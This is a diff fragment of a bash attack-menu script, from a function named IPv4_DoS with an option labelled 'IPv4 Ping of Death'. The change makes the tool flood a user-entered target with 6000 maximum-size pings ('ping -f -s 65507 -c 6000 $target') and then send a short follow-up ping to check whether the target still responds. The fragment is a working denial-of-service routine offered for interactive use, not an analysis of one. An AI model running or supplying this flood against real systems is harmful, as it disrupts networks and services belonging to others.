@@ -456,14 +456,16 @@ function IPv4_DoS {
             "2.1.1. IPv4 Ping of Death")
                 clear
                 echo '--------------------------------------'
-                echo 'command is "ping -f -s 65507 $target"'
+                echo 'command is "ping -f -s 65507 -c 6000 $target"'
                 echo '--------------------------------------'
                 printf 'run this command (Y/n)? '
                 read answer
                 if [ "$answer" != "${answer#[Yy]}" ] || [ "$answer" == '' ] ;then 
                     printf 'target: '
                     read target
-                    ping -f -s 65507 $target
+                    ping -f -s 65507 -c 6000 $target
+                    sleep 3
+                    ping -c 4 $target
                 else
                     echo Done
                 fi;;
